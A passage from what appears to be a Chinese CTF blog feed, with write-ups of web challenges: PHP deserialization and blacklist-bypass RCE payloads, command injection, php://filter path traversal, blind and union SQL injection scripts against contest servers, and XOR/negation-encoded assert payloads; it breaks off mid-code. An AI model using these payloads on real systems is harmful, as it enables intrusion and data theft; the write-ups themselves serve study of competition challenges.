朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>抓包后，读源码</p><p><img src="/2020/08/8月刷题记录/image-20200815235733909.png" alt="image-20200815235733909"></p><p>过滤很多，但有个反序列化函数没被禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"ls"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200816000143586.png" alt="image-20200816000143586"></p><p>命名空间绕过黑名单</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=\system&amp;p=cat <span class="constructor">$(<span class="params">find</span> <span class="operator">/</span> -<span class="params">name</span> <span class="params">flag</span><span class="operator">*</span>)</span></span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>写脚本爆破GET和POST参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'echo "hello_qwb_qwb";'</span></span><br><span class="line">url = <span class="string">'http://127.0.0.1/src/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz(filename):</span><br><span class="line">    file = open(<span class="string">"./src/"</span> + filename, <span class="string">"r"</span>)</span><br><span class="line">    # <span class="builtin-name">print</span> <span class="string">"[*]open:"</span> + filename</span><br><span class="line">    text = file.read()</span><br><span class="line"></span><br><span class="line">    getpattern = re.compile(r<span class="string">'\$_GET\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    <span class="builtin-name">get</span> = getpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    postpattern = re.compile(r<span class="string">'\$_POST\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    post = postpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    file_url = url + filename</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> get:</span><br><span class="line">        r = requests.<span class="builtin-name">get</span>(file_url + <span class="string">"?"</span> + g + <span class="string">"="</span> + urllib.quote(payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]file:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]get:"</span> + g)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> post:</span><br><span class="line">        data = &#123;p: payload&#125;</span><br><span class="line">        r = requests.post(file_url, <span class="attribute">data</span>=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]flie:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]post:"</span> + p)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]finish:"</span> + filename)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TextThread(threading.Thread):</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.__queue = queue</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        global text</span><br><span class="line">       <span class="built_in"> queue </span>= self.__queue</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">            filename = queue.<span class="builtin-name">get</span>()</span><br><span class="line">            fuzz(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">   <span class="built_in"> queue </span>= Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'./src'</span>):</span><br><span class="line">        queue.put(filename)</span><br><span class="line"></span><br><span class="line">    thread_count = 8</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, thread_count):</span><br><span class="line">        thread = TextThread(queue)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; class=&quot;aplayer-secondary-script-marker&quot;&gt;&lt;/script&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;ACTF2020-新生赛-Include&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Include&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]Include&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Include&lt;/h3&gt;&lt;p&gt;伪协议加文件包含&lt;/p&gt;&lt;p&gt;&lt;code&gt;?file=php://filter/read/convert.base64-encode/resource=flag.php&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&quot;ACTF2020-新生赛-Exec&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Exec&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]Exec&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Exec&lt;/h3&gt;&lt;p&gt;命令执行&lt;/p&gt;&lt;p&gt;&lt;code&gt;127.0.0.1;cat /flag&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&quot;ACTF2020-新生赛-BackupFile&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-BackupFile&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]BackupFile&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]BackupFile&lt;/h3&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="刷题" scheme="https://0xcreed.jxustctf.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_7月赛</title>
    <link href="https://0xcreed.jxustctf.top/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/"/>
    <id>https://0xcreed.jxustctf.top/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/</id>
    <published>2020-07-26T08:29:16.000Z</published>
    <updated>2020-07-26T10:35:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ezinclude"><a href="#1-Ezinclude" class="headerlink" title="1.Ezinclude"></a>1.Ezinclude</h3><p>  URL的请求加了个unix时间戳，只能写脚本淦。后面测试发现gqy.jpg和/gqy.jpg回显相同，可以判断文件名前拼接了路径，这种情况无法使用wrapper等手段的。同时waf也会过滤 <code>../</code>。尝试多次都没包含成功，就强行用了下伪协议成功了，后面看了源码醉了，如果f参数的开头给出一个目录再穿越就可以绕过waf了。这里的伪协议就相当于目录。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">file=<span class="string">b'php://filter/read=convert.base64-encode/resource=../../../../../../../../../../flag'</span></span><br><span class="line">t=int(time.time())</span><br><span class="line">f= base64.b64encode(file).decode()</span><br><span class="line">url = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t,f)</span><br><span class="line"><span class="comment">#print(url)</span></span><br><span class="line">res = requests.get(url=url)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you miss some parameters"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">'t'</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"what's your time?"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">'f'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">"/../"</span>)) === <span class="string">"/../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"../"</span>)) === <span class="string">"../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"./"</span>)) === <span class="string">"./"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"/."</span>)) === <span class="string">"/."</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"//"</span>)) === <span class="string">"//"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not allowed to do that.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/img/'</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-SQLI"><a href="#2-SQLI" class="headerlink" title="2.SQLI"></a>2.SQLI</h3><p>就大概看了下题目，后面比赛结束环境没了，就看了下<a href="https://www.gem-love.com/ctf/2514.html" target="_blank" rel="noopener">y1ng</a>师傅的题解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L'Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="comment">#库名 利用limit注入 sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名 flllaaaggg</span></span><br><span class="line">payload = <span class="string">'''SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE table_schema='sqlidb' GROUP BY table_name limit 0,1'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">true<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">truetruehost = <span class="string">'''http://183.129.189.60:10004/?id=1'=(substr((&#123;payload&#125;),&#123;i&#125;,1)='&#123;char&#125;')%23'''</span>.format(payload=payload.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">truetruer = req.get(host)</span><br><span class="line">truetrue<span class="keyword">if</span> <span class="string">r'admin666'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">truetruetrueres += char</span><br><span class="line">truetruetrueprint(<span class="string">"found it: "</span>+res)</span><br><span class="line">truetruetrue<span class="keyword">break</span></span><br><span class="line">truetruet.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>因为可以联合注入，所以直接联合查表也行</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span><span class="comment">/**/</span>sys.x$schema_flattened_keys<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="string">'sqlidb'</span><span class="comment">/**/</span><span class="keyword">GROUP</span><span class="comment">/**/</span><span class="keyword">BY</span><span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>’<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span>*,<span class="number">1</span><span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>flllaaaggg%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>记录一下bypass information_schema的库</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">host_summary</span> -&gt;</span> host、total_connections历史连接IP、对应IP的连接次数</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_schema</span> -&gt;</span> object_schema库名</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_table</span> -&gt;</span> object_schema、object_name库名、表名(可指定)</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_bytes</span> -&gt;</span> file路径中包含库名</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_latency</span> -&gt;</span> file路径中包含库名</span><br><span class="line"> <span class="function"><span class="title">processlist</span> -&gt;</span> current_statement、last_statement当前数据库正在执行的语句、该句柄执行的上一条语句</span><br><span class="line"> <span class="function"><span class="title">schema_auto_increment_columns</span> -&gt;</span> table_schema、table_name、column_name库名、表名、列名</span><br><span class="line"> <span class="function"><span class="title">schema_index_statistics</span> -&gt;</span> table_schema、table_name库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_object_overview</span> -&gt;</span> db库名</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics</span> -&gt;</span> table_schema、table_name库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics_with_buffer</span> -&gt;</span> table_schema、table_name库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_tables_with_full_table_scans</span> -&gt;</span> object_schema、object_name库名、表名(全面扫描访问)</span><br><span class="line"> <span class="function"><span class="title">session</span> -&gt;</span> current_statement、last_statement当前数据库正在执行的语句、该句柄执行的上一条语句</span><br><span class="line"> <span class="function"><span class="title">statement_analysis</span> -&gt;</span> query、db数据库最近执行的请求、对于请求访问的数据库名</span><br><span class="line"> <span class="function"><span class="title">statementswith</span>* -&gt;</span> query、db数据库最近执行的特殊情况的请求、对应请求的数据库</span><br><span class="line"> <span class="function"><span class="title">version</span> -&gt;</span> mysql_versionmysql版本信息</span><br><span class="line"> x$innodb_buffer_stats_by_schema同innodb_buffer_stats_by_schema</span><br><span class="line"> x$innodb_buffer_stats_by_table同innodb_buffer_stats_by_table</span><br><span class="line"> x$io_global_by_file_by_bytes同io_global_by_file_by_bytes</span><br><span class="line"> <span class="function"><span class="title">x</span>$schema_flattened_keys -&gt;</span> table_schema、table_name、index_columns库名、表名、主键名</span><br><span class="line"> <span class="function"><span class="title">x</span>$ps_schema_table_statistics_io -&gt;</span> table_schema、table_name、count_read库名、表名、读取该表的次数</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-welcome-to-the-misc-world"><a href="#1-welcome-to-the-misc-world" class="headerlink" title="1.welcome to the misc world"></a>1.welcome to the misc world</h3><p>和北邮校赛的一道题挺类似的，LSB隐写。可以用<a href="https://0xcreed.jxustctf.top/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/#3-Hello-misc">脚本</a>也可以用<code>zsteg</code>,分离得到一张包含密码的图片。</p><p><img src="/2020/07/DASCTF-7月赛/image-20200726181457308.png" alt="image-20200726181457308"></p><p>得到密码: <code>/*///1258/*/@#</code></p><p>解压后得到hint.png和7.png。hint.png最后有一串base64字符串，解码后是Unicode</p><p>![批注 2020-07-25 104650](DASCTF-7月赛/批注 2020-07-25 104650.jpg)</p><p>社会主义核心价值观解码</p><p>![批注 2020-07-25 105244](DASCTF-7月赛/批注 2020-07-25 105244.jpg)</p><p>找了很久没有找到疑似base85的字符串</p><p>最后7z打开压缩包 。。。NTFS隐写</p><p>![批注 2020-07-25 113101](DASCTF-7月赛/批注 2020-07-25 113101.jpg)</p>]]></content>
    
    <summary type="html">
    
      好久没打比赛了
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第四届第五空间安全大赛</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2020-06-24T02:23:56.000Z</published>
    <updated>2020-08-22T01:55:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-hate-php"><a href="#1-hate-php" class="headerlink" title="1.hate-php"></a>1.<strong>hate-php</strong></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>禁用了 <code>=</code> 所以伪协议 拼接字符串 等方法用不了</p><p>但 取反和异或没被禁用</p><p>取反payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(~<span class="symbol">%8</span>C<span class="symbol">%86</span><span class="symbol">%8</span>C<span class="symbol">%8</span>B<span class="symbol">%9</span>A<span class="symbol">%92</span>)(~<span class="symbol">%9</span>C<span class="symbol">%9</span>E<span class="symbol">%8</span>B<span class="symbol">%DF</span><span class="symbol">%99</span><span class="symbol">%93</span><span class="symbol">%9</span>E<span class="symbol">%98</span><span class="symbol">%D1</span><span class="symbol">%8</span>F<span class="symbol">%97</span><span class="symbol">%8</span>F)</span><br></pre></td></tr></table></figure><p> 异或payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%D3</span><span class="symbol">%D9</span><span class="symbol">%D3</span><span class="symbol">%D4</span><span class="symbol">%C5</span><span class="symbol">%CD</span>)(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%C3</span><span class="symbol">%C1</span><span class="symbol">%D4</span><span class="symbol">%80</span><span class="symbol">%C6</span><span class="symbol">%CC</span><span class="symbol">%C1</span><span class="symbol">%C7</span><span class="symbol">%8</span>E<span class="symbol">%D0</span><span class="symbol">%C8</span><span class="symbol">%D0</span>)</span><br></pre></td></tr></table></figure><p><a href="http://0xcreed.jxustctf.top/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/#RCE-me-I-don%E2%80%99t-think-U-can-system-RCE-prove-to-me">异或构造脚本</a></p><h3 id="2-do-you-know"><a href="#2-do-you-know" class="headerlink" title="2.do you know"></a>2.do you know</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 